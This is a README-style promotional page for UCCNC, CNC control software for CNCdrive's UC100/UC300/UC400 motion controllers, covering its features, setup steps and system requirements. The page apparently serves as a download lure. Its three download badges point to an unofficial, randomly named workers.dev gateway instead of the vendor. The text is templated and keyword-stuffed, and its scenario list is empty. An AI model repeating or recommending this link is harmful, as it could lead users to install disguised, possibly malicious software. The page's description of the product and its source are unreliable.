# UCCNC - lightweight interface, hardware-matched motion, customizable macros

[![Download UCCNC](https://img.shields.io/badge/Download-UCCNC-2ecc71?style=flat-square&logo=download&logoColor=white)](https://gateway-w47a.valedaleekpqkd.workers.dev/ucnc)

## Fast CNC Software Brief

Q: What is UCCNC? A: A dedicated control application for CNCdrive's UC family of motion controllers.  
Q: Who uses it? A: Hobbyists and small shops running routers, mills and engravers.  
Q: Why choose it? A: It pairs tightly with its hardware for stable, low-jitter motion.  
Q: Can it be customized? A: Yes, through a screen editor, macros and a scripting API.  

## CNC Software Overview

UCCNC was designed specifically to run alongside CNCdrive's UC100, UC300 and UC400 motion controllers, giving it a level of hardware integration that generic control software rarely matches. This tight coupling translates into predictable timing and a stable feel on the shop floor.

The application keeps its footprint small and its interface approachable, which makes it a favorite among people upgrading from parallel-port setups. Despite that simplicity, it hides considerable depth in its macro engine and plugin support.

Under the hood UCCNC interprets standard G-code, manages coordinate systems and offsets, and hands precise step generation to the connected UC board. The result is a control experience that feels immediate and responsive.

## UCCNC Capability Matrix

| Function | Role in workflow |
| --- | --- |
| G-code parser | Reads and queues part programs |
| Macro engine | Runs custom logic written in C# style scripts |
| Screen editor | Rearranges buttons, gauges and fields |
| Plugin API | Extends functionality with community add-ons |
| Offset manager | Handles work and tool coordinate offsets |
| Jogging controls | Provides manual axis movement and MPG support |
| Probing macros | Automates tool and surface measurement |
| Toolpath preview | Visualizes the loaded program before running |

These functions combine into a streamlined pipeline where writing a macro or tweaking a screen directly improves the way you cut, measure and finish each job.

## Getting Started Playbook

Install UCCNC and connect your UC motion controller, then load the profile that matches your machine's axis configuration. Set your steps-per-unit, motor velocities and acceleration so the axes move accurately before any cutting begins.

With motion calibrated, test your limit and home switches, then run a short air-cut program to confirm feeds and spindle behavior. Keep a backup of your profile and macros so a fresh install can be restored in minutes.

## Everyday Use

Day to day, you open a G-code file, zero your axes against the workpiece, and start the cycle while the toolpath preview and DRO keep you oriented. Custom macros can handle repetitive setup steps, turning multi-click routines into a single button press for consistent results.

## Practical Scenarios

Scenario A - Upgrading a hobby router from parallel port to a modern USB controller:  
Scenario B - Automating tool length measurement with a fixed probe macro:  
Scenario C - Designing a compact touchscreen layout for a small engraver:  
Scenario D - Adding a community plugin to control an automatic tool changer:  

[![Download UCCNC](https://img.shields.io/badge/Download-UCCNC-2ecc71?style=flat-square&logo=download&logoColor=white)](https://gateway-w47a.valedaleekpqkd.workers.dev/ucnc)

## System Requirements

| Item | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows XP 32-bit | Windows 10/11 64-bit |
| CPU | 1.5 GHz single-core | Dual-core 2.5 GHz |
| RAM | 1 GB | 4 GB |
| Storage | 200 MB free | 1 GB |
| Graphics | Basic OpenGL | Dedicated OpenGL GPU |
| Other | UC motion controller | USB 2.0 port |

## Download UCCNC

[![Download UCCNC](https://img.shields.io/badge/Download-UCCNC-2ecc71?style=flat-square&logo=download&logoColor=white)](https://gateway-w47a.valedaleekpqkd.workers.dev/ucnc)

## Keywords

UCCNC, CNC control, CNCdrive, UC100, UC300, motion controller, G-code, router control, mill control, engraver, macro engine, screen editor, plugin API, offsets, jogging, MPG, probing, toolpath preview, steps per unit, acceleration tuning, parallel port upgrade, hobby CNC, small shop, USB controller, machine profile
